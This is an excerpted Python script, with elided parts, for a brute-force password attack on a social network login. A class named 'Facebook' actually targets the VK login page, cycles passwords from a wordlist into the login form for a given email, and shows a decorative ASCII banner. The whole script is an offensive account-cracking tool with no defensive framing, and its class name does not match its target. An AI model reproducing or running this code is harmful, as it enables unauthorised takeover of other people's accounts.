...
class Facebook:
    def __init__(self, mail, wordlist, delay):
        self.mail = mail
        self.url = 'https://login.vk.com/?act=login'
    ...
    def banner(self):
        print (self.col.BLUE) + ("""
      ```        -+ssyyyyyso:                     
mMMMMMMMMN+     .odMMMMMMMMMM:       `hMMMMMMMMMMm
/MMMMMMMMMM/       hMMMMMMMMM/       hMMMMMMMMMMMs
 +MMMMMMMMMM/      +MMMMMMMMM:      yMMMMMMMMMMMo 
  oMMMMMMMMMM+     /MMMMMMMMM:    `hMMMMMMMMMMm:  
   +MMMMMMMMMM+    +MMMMMMMMM-   .mMMMMMMMMMMy`   
    /MMMMMMMMMMh.  hMMMMMMMMM/ `oMMMMMMMMMMm:     
     :NMMMMMMMMMMhdMMMMMMMMMMMhNMMMMMMMMMMy`      
      .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN`       
        oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm/      
         -dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm+    
           +NMMMMMMMMMMMMMMMMMs/sNMMMMMMMMMMMMm/  
            `+dMMMMMMMMMMMMMMo   `oMMMMMMMMMMMMMh`
               .+hMMMMMMMMMMM:     .yMMMMMMMMMMMMm
                   -/+ssssss+        `/syyyyyssss:
        """) + (self.col.ENDC)
    ...
    def attack(self, password):
        try:
            ...
            br.form['index_email'] = self.mail
            br.form['index_pass'] = password
            br.submit()
            log = br.geturl()
            if (log != self.url) and (not 'login_attempt' in log):
                sys.stdout.write("\r")
                sys.stdout.flush()
...
if __name__ == "__main__":
    ...
    wordlist = sys.argv[2]
    delay = sys.argv[3]
    f = Facebook(mail, wordlist, delay)
    f.banner()
    f.crack()
